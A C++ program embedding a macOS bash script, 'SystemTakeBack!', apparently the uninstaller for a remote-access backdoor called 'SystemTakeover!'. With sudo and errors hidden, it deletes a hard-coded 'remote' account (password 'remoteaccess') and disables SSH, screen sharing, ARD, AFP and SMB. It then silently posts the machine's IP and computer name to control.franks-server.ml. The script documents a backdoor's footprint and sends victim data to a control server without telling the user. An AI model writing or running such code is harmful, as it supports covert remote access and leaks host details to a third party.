#include <iostream>
using namespace std;

#define SHELLSCRIPT "\
#/bin/bash \n\
USERNAME=\"remote\" \n\
PASS=\"remoteaccess\" \n\
clear \n\
base64 -D <<<\"ICAgX19fX18gICAgICAgICAgIF8gICAgICAgICAgICAgIF9fX19fX18gICAgXyAgICAgICAgX19fXyAgICAgICAgICAgICBfICAgIF8gCiAgLyBfX19ffCAgICAgICAgIHwgfCAgICAgICAgICAgIHxfXyAgIF9ffCAgfCB8ICAgICAgfCAgXyBcICAgICAgICAgICB8IHwgIHwgfAogfCAoX19fICBfICAgXyBfX198IHxfIF9fXyBfIF9fIF9fXyB8IHwgX18gX3wgfCBfX19fX3wgfF8pIHwgX18gXyAgX19ffCB8IF98IHwKICBcX19fIFx8IHwgfCAvIF9ffCBfXy8gXyBcICdfIGAgXyBcfCB8LyBfYCB8IHwvIC8gXyBcICBfIDwgLyBfYCB8LyBfX3wgfC8gLyB8CiAgX19fXykgfCB8X3wgXF9fIFwgfHwgIF9fLyB8IHwgfCB8IHwgfCAoX3wgfCAgIDwgIF9fLyB8XykgfCAoX3wgfCAoX198ICAgPHxffAogfF9fX19fLyBcX18sIHxfX18vXF9fXF9fX3xffCB8X3wgfF98X3xcX18sX3xffFxfXF9fX3xfX19fLyBcX18sX3xcX19ffF98XF8oXykKICAgICAgICAgIF9fLyB8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgIHxfX18vICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA==\" \n\
echo \n\
echo \n\
echo \"SystemTakeBack! Version 1.0 Build 20200229\" \n\
echo \n\
read -r -p \"Ready to revert what SystemTakeover! has done? [Y/n] \" response \n\
if [ -z \"$response\" ] \n\
then \n\
      response=\"y\" \n\
fi \n\
case \"$response\" in \n\
    [yY][eE][sS]|[yY]) \n\
        echo \n\
        echo \"This script requires an administrator password.\" \n\
        echo \"Please enter your password below.\" \n\
        echo \n\
        sudo rm -rf /Local/Users/${USERNAME} &>/dev/null \n\
        sudo dscl . -delete /Users/${USERNAME} &>/dev/null \n\
        sudo dseditgroup -o delete -q com.apple.access_ssh &>/dev/null \n\
        sudo dseditgroup -o delete -q com.apple.access_ssh-disabled &>/dev/null \n\
        sudo systemsetup -setremotelogin -f off &>/dev/null \n\
        sudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist &>/dev/null \n\
        sudo rm -f /var/db/launchd.db/com.apple.launchd/overrides.plist &>/dev/null \n\
        sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.screensharing.plist &>/dev/null \n\
        sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -deactivate -configure -access -off &>/dev/null \n\
        sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.AppleFileServer.plist &>/dev/null \n\
        sudo launchctl unload -w /System/Library/LaunchDaemons/com.apple.smbd.plist &>/dev/null \n\
        sudo sharing -r \"root\" &>/dev/null \n\
        IP=$(ipconfig getifaddr en0) \n\
        COMNAME=$(scutil --get ComputerName) \n\
        sudo curl --data \"ip=${IP}&name=${COMNAME}\" https://control.franks-server.ml/delete.php &>/dev/null \n\
        clear \n\
        echo \n\
        echo \"Script has finished running. Your computer is now back to safety.\" \n\
        echo \n\
        exit 0 \n\
        ;; \n\
    *) \n\
        exit 1 \n\
        ;; \n\
esac\
"

int main() {
    system(SHELLSCRIPT);
    return 0;
}
